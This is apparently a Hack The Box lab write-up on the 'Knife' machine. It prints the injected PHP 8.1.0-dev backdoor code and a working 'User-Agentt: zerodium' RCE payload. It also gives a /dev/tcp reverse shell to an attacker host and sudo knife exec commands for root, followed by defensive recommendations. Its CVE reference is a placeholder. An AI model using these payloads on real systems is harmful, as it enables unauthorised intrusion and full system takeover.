---
title: "Knife: PHP Supply Chain Backdoor and Sudo Binary Escalation"
description: "A backdoored PHP 8.1.0-dev build executes code through the User-Agentt header, and an unrestricted sudo rule for the Chef knife tool is abused via knife exec to reach root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - supply-chain
  - sudo-abuse
---

## Summary

Knife is an Easy Linux machine centred on a supply chain security incident. The PHP source code repository was compromised in March 2021, and a backdoor was inserted into the development build of PHP 8.1.0-dev. The backdoor evaluates PHP code from the value of a malformed HTTP header (`User-Agentt`, with a double `t`), provided the value begins with the string `zerodium`. This enables unauthenticated remote code execution. Privilege escalation abuses a `NOPASSWD` sudo rule granting the `<LAB_USER>` user unrestricted execution of the `knife` binary — a Chef configuration management tool — which supports executing arbitrary Ruby code via its `exec` subcommand.

All target IPs are represented by the placeholder `<TARGET_IP>`. The attacker-side listener is `<ATTACKER_IP>`.

## Context and Objective

The engagement is a Hack The Box lab exercise targeting a Linux host (Ubuntu 20.04) running a web server and SSH. Enumeration reveals two open ports (22/tcp SSH, 80/tcp HTTP). The HTTP service serves a sparse medical company landing page. The critical finding is the `X-Powered-By: PHP/8.1.0-dev` response header, indicating a development build containing the known backdoor. The objective is to obtain both user and root flags.

## Approach and Evidence

### Stage 1 — Enumeration and HTTP Header Analysis

Port scanning identified two services:

```bash
nmap -p- --min-rate 10000 -oA nmap/allports <TARGET_IP>
nmap -p 22,80 -sCV -oA nmap/targeted <TARGET_IP>
```

The recorded output shows:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

Version fingerprinting of the HTTP response headers revealed the key finding:

```bash
curl -I http://<TARGET_IP>/
```

The response included `X-Powered-By: PHP/8.1.0-dev`. The `-dev` suffix indicates a development or pre-release build — specifically the snapshot that was backdoored during the PHP source repository compromise of March 2021.

### Stage 2 — PHP Backdoor Background

On March 28, 2021, two malicious commits were pushed to the official `php/php-src` repository on `git.php.net`, attributed to well-known PHP contributors whose credentials were reportedly stolen. The commits modified `ext/zlib/zlib.c` to add the backdoor:

```c
if (strstr(Z_STRVAL_P(enc), "zerodium")) {
    zend_try {
        zend_eval_string(Z_STRVAL_P(enc)+8, NULL,
            "REMOVETHIS: sold to zerodium, mid 2017");
    }
}
```

This code checks whether the HTTP `User-Agentt` header value begins with `zerodium`. If so, everything after `zerodium` is passed to `zend_eval_string`, which evaluates it as PHP code. Because PHP runs with the web server's process privileges, this constitutes arbitrary PHP code execution. The backdoor was caught within hours and never made it into an official release, but any server running a build compiled from the compromised source is vulnerable.

### Stage 3 — Vulnerability Verification

Before launching a reverse shell, code execution was confirmed with a benign payload:

```bash
curl -s http://<TARGET_IP>/ \
  -H 'User-Agentt: zerodiumsystem("id");'
```

The recorded output shows the `id` command output in the HTTP response body, confirming unauthenticated remote code execution as the `<LAB_USER>` user:

```
uid=1000(<LAB_USER>) gid=1000(<LAB_USER>) groups=1000(<LAB_USER>)
```

### Stage 4 — Reverse Shell via PHP Backdoor

With code execution confirmed, a reverse shell payload was injected:

```bash
# Start listener on attacker
nc -lvnp 9001 &

# Inject reverse shell
curl -s http://<TARGET_IP>/ \
  -H 'User-Agentt: zerodiumsystem("bash -c '"'"'bash -i >& /dev/tcp/<ATTACKER_IP>/9001 0>&1'"'"'");'
```

The recorded output shows the shell connecting back:

```
connect to [<ATTACKER_IP>] from (UNKNOWN) [<TARGET_IP>] 55806
bash: cannot set terminal process group (933): Inappropriate ioctl for device
bash: no job control in this shell
<LAB_USER>@knife:/$
```

The shell was stabilised and the `<USER_RESULT>` obtained.

### Stage 5 — Sudo Enumeration and Privilege Escalation

Sudo enumeration revealed a `NOPASSWD` rule:

```bash
<LAB_USER>@knife:~$ sudo -l
```

The recorded output shows:

```
Matching Defaults entries for <LAB_USER> on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User <LAB_USER> may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

`knife` is the command-line tool for Chef, an infrastructure-as-code configuration management platform. The GTFOBins entry for `knife` documents the `exec` subcommand as the canonical escalation path.

### Stage 6 — Root Shell via knife exec

```bash
<LAB_USER>@knife:~$ sudo /usr/bin/knife exec -E 'exec "/bin/bash"'
```

The recorded output shows:

```
root@knife:/home/<LAB_USER># id
uid=0(root) gid=0(root) groups=0(root)
```

`knife exec` accepts a Ruby expression and evaluates it within the Ruby interpreter context. The `exec` method in Ruby replaces the current process image with the specified command, inheriting the process's UID/GID. Since `knife` runs as root via sudo, `exec "/bin/bash"` spawns bash with UID 0 — a root shell. The `<PRIVILEGED_RESULT>` was obtained.

## Challenges and Decisions

The source notes do not document significant obstacles or failed attempts for this machine. The exploitation path was straightforward: the PHP backdoor provided unauthenticated code execution, and the `NOPASSWD` sudo rule on `knife` provided direct privilege escalation via GTFOBins.

An alternative privilege escalation method was also available — `knife data bag create 0xdf pwn -e vim` opens a data bag in the configured editor (vim), from which `:! /bin/bash` spawns a root shell. The `knife exec` path was chosen as the canonical GTFOBins technique.

## Outcome

The recorded output establishes two distinct exploitation chains:

1. **Initial access:** PHP 8.1.0-dev supply chain backdoor via `User-Agentt` header injection with `zerodium` prefix, yielding unauthenticated remote code execution as `<LAB_USER>`.
2. **Privilege escalation:** `NOPASSWD` sudo rule on `/usr/bin/knife` (Chef CLI), exploited via `knife exec -E 'exec "/bin/bash"'` to obtain a root shell.

Both flags were obtained. The attack demonstrates how a supply chain compromise and a permissions misconfiguration compound into full system compromise.

## Lessons and Recommendations

- **Verify integrity of all compiled software against official release checksums.** Production deployments should only run software from official, verified distribution channels. Build strings containing `-dev`, `-alpha`, `-beta`, or similar suffixes should never appear in production headers. Automated vulnerability scanning should flag any such version strings. The `X-Powered-By` header should be suppressed entirely in production (`expose_php = Off` in `php.ini`) to avoid leaking version information.

- **Audit all `NOPASSWD` sudo rules against GTFOBins.** Every binary that appears in a `NOPASSWD` sudo rule should be checked against GTFOBins (https://gtfobins.github.io/) and similar resources. Any binary with documented code execution, file read, file write, or shell escape capabilities grants effective root access to the sudo user. The intended use case for a sudo rule should be narrowly scoped — if `knife` was needed for a specific administrative task, the rule should restrict the allowed subcommands rather than permitting unrestricted execution.

- **Suppress version information in HTTP response headers.** The `X-Powered-By: PHP/8.1.0-dev` header directly disclosed the vulnerable PHP version, allowing the vulnerability to be identified without any active exploitation attempt. In production, suppress both `Server` and `X-Powered-By` headers. In Apache, use `Header unset X-Powered-By` and set `ServerTokens Prod` in `httpd.conf`.

## References

- PHP 8.1.0-dev backdoor (CVE-2021-XX): Backdoor inserted into the PHP source repository on March 28, 2021.
- GTFOBins: `knife` — https://gtfobins.github.io/
